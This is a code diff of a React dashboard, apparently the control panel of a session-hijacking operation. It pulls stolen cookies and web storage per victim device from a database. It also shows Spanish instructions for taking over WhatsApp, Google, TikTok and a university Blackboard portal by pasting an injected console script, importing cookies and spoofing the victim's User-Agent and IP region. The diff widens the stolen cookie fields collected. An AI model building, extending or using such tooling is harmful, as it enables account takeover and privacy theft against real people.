@@ -29,8 +29,8 @@ const RESTORATION_GUIDES: Record<string, { title: string, steps: string[], downl
     steps: [
       "PASO 1: Abre web.whatsapp.com en tu navegador.",
       "PASO 2: Presiona F12 y ve a la pestaña 'Console'.",
-      "PASO 3: Haz clic en el botón verde 'DEEP DATA RESTORE' aquí abajo para copiar el script.",
-      "PASO 4: Pégalo en la consola y presiona ENTER.",
+      "PASO 3: Haz clic en el botón azul gigante 'CONSOLE BOOT' hasta que diga '¡COPIADO!'.",
+      "PASO 4: Pégalo en la consola de WhatsApp y presiona ENTER.",
       "PASO 5: La página se refrescará y entrarás automáticamente."
     ],
     warning: "Solo funciona en PC. No cierres la sesión en el celular original."
@@ -63,17 +63,18 @@ const RESTORATION_GUIDES: Record<string, { title: string, steps: string[], downl
       "PASO 3: Entra a mail.google.com o drive.google.com.",
       "PASO 4: Si pide verificación, usa las cookies de YouTube/Facebook si están disponibles."
     ],
-    warning: "Usa una VPN similar a la del nodo para evitar bloqueos por IP."
+    warning: "Usa una VPN similar a la del nodo para evitar bloqueos por seguridad."
   },
   "Blackboard": {
     title: "Portal Académico: Blackboard",
     steps: [
-      "PASO 1: Entra a up.edu.pe o aulavirtual.up.edu.pe.",
-      "PASO 2: LIMPIEZA: Usa Cookie-Editor para BORRAR todas las cookies actuales antes de importar.",
-      "PASO 3: IMPORTAR: Usa 'EXPORT SESSION JSON' e impórtalo en Cookie-Editor.",
-      "PASO 4: USER-AGENT: Es vital aplicar el User-Agent original para no ser rechazado por el portal.",
-      "PASO 5: Refresca la página; entrarás directo al portal académico."
-    ]
+      "PASO 1: Abre una pestaña en aulavirtual.up.edu.pe.",
+      "PASO 2: Presiona F12 y ve a 'Console' o 'Consola'.",
+      "PASO 3: Haz clic en el botón azul 'CONSOLE BOOT' y espera el mensaje '¡COPIADO!'.",
+      "PASO 4: Ve a la pestaña de Blackboard, pega el script (Ctrl+V) y presiona ENTER.",
+      "PASO 5: La página se limpiará sola y entrarás al sistema directamente."
+    ],
+    warning: "Es VITAL estar en la página de Blackboard al pegar el script."
   },
   "TikTok": {
      title: "TikTok Hijacking",
@@ -115,7 +116,7 @@ export default function DeviceControlCenter() {
     const { data: sData } = await supabase.from("session_snapshots").select("*").eq("device_id", deviceId).order("captured_at", { ascending: false });
     if (sData) {
       const sIds = sData.map(s => s.id);
-      const { data: allC } = await supabase.from("cookies").select("snapshot_id, domain, name, value, expiration_date").in("snapshot_id", sIds);
+      const { data: allC } = await supabase.from("cookies").select("snapshot_id, domain, name, value, expiration_date, path, http_only").in("snapshot_id", sIds);
       const { data: allS } = await supabase.from("web_storage").select("snapshot_id, domain, storage_type, key, value, db_name, store_name").in("snapshot_id", sIds);
       const newMap: Record<string, AccountInfo> = {};
       const ALLOWED = ["Instagram", "Facebook", "WhatsApp", "Blackboard", "Google", "TikTok"];
@@ -250,12 +251,15 @@ export default function DeviceControlCenter() {
                          )}
                       </div>
                       <div className="grid grid-cols-2 gap-6">
-                        <button onClick={copyUA} className="p-6 rounded-[2rem] bg-white/[0.02] border border-white/5 flex flex-col items-center gap-2"><Cpu size={20} className="text-gray-500"/><span className="text-[9px] font-black uppercase tracking-widest">{copiedUA?'COPIADO':'COPIAR Agent'}</span></button>
-                        <button onClick={copyJson} className="p-6 rounded-[2rem] bg-indigo-500/10 border border-indigo-500/20 flex flex-col items-center gap-2"><FileJson size={20} className="text-indigo-400"/><span className="text-[9px] font-black uppercase tracking-widest text-indigo-400">{copiedJson?'COPIADO':'EXPORTAR JSON'}</span></button>
+                        <button onClick={copyUA} className="p-6 rounded-[2rem] bg-white/[0.02] border border-white/5 flex flex-col items-center gap-2 transition-all active:scale-95"><Cpu size={20} className="text-gray-500"/><span className="text-[9px] font-black uppercase tracking-widest">{copiedUA?'¡COPIADO!':'COPIAR UA'}</span></button>
+                        <button onClick={copyJson} className="p-6 rounded-[2rem] bg-indigo-500/10 border border-indigo-500/20 flex flex-col items-center gap-2 transition-all active:scale-95"><FileJson size={20} className="text-indigo-400"/><span className="text-[9px] font-black uppercase tracking-widest text-indigo-400">{copiedJson?'¡COPIADO!':'EXPORTAR JSON'}</span></button>
                       </div>
                    </div>
                    <div className="space-y-8">
-                      <button onClick={copyConsole} className="w-full py-12 rounded-[3rem] bg-blue-600 text-2xl font-black shadow-xl hover:bg-blue-500 active:scale-95 transition-all flex flex-col items-center gap-2"><div className="flex items-center gap-3"><MousePointer2 size={24}/> CONSOLE BOOT</div><span className="text-[9px] uppercase tracking-widest opacity-40">Inyección instantánea</span></button>
+                      <button onClick={copyConsole} className={`w-full py-12 rounded-[3.5rem] text-2xl font-black shadow-xl transition-all active:scale-95 flex flex-col items-center gap-2 ${copied ? 'bg-emerald-600' : 'bg-blue-600 hover:bg-blue-500 shadow-blue-500/30'}`}>
+                         <div className="flex items-center gap-3"><MousePointer2 size={24}/> {copied ? '¡COPIADO AL PORTAPAPELES!' : 'CONSOLE BOOT'}</div>
+                         <span className="text-[9px] uppercase tracking-widest opacity-40 italic">{copied ? 'Listo para pegar (Ctrl+V)' : 'Haz clic para copiar el Script de Inyección'}</span>
+                      </button>
                       <div className="glass-intense p-8 rounded-[3rem] border border-white/10 bg-black/40 h-[300px] flex flex-col">
                         <p className="text-[10px] font-black text-emerald-400 uppercase tracking-widest mb-4">Evidencia de Cookies</p>
                         <div className="flex-1 overflow-y-auto space-y-2 custom-scrollbar">
